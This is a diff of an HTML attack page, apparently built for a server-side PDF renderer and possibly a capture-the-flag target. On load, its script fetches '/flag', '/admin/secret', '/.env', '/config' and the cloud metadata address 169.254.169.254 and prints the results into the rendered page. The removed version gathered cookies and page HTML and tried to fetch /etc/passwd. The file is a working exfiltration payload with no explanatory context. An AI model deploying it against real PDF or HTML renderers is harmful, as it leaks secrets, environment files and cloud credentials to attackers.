@@ -1,41 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>Leak Info for PDF Render</title>
+  <meta charset="UTF-8" />
+  <title>Leak Internal Info</title>
 </head>
 <body>
-<h1>Server Side PDF Render Leak</h1>
-<div id="info" style="white-space: pre-wrap; font-family: monospace;"></div>
+  <h1>Collecting sensitive info...</h1>
+  <pre id="output"></pre>
 
-<script>
-(async function() {
-  let info = '';
+  <script>
+    const endpoints = [
+      "/flag",
+      "/admin/secret",
+      "/.env",
+      "/config",
+      "http://169.254.169.254/latest/meta-data/"
+    ];
 
-  info += 'Cookies:\n' + document.cookie + '\n\n';
+    const output = document.getElementById("output");
 
-  // URL
-  info += 'Current URL:\n' + window.location.href + '\n\n';
-
-  // User Agent
-  info += 'User Agent:\n' + navigator.userAgent + '\n\n';
-
-  info += 'Page HTML Content:\n' + document.documentElement.outerHTML + '\n\n';
-
-  try {
-    const res = await fetch('/etc/passwd');
-    if(res.ok) {
-      const text = await res.text();
-      info += '/etc/passwd content:\n' + text + '\n\n';
-    } else {
-      info += '/etc/passwd fetch failed: ' + res.status + '\n\n';
+    async function leak() {
+      for (const url of endpoints) {
+        try {
+          const res = await fetch(url);
+          if (res.ok) {
+            const text = await res.text();
+            output.textContent += `=== ${url} ===\n${text}\n\n`;
+          } else {
+            output.textContent += `=== ${url} ===\nFailed with status: ${res.status}\n\n`;
+          }
+        } catch (e) {
+          output.textContent += `=== ${url} ===\nError: ${e.message}\n\n`;
+        }
+      }
     }
-  } catch(e) {
-    info += 'Fetch error: ' + e.message + '\n\n';
-  }
 
-  document.getElementById('info').textContent = info;
-})();
-</script>
+    leak();
+  </script>
 </body>
 </html>
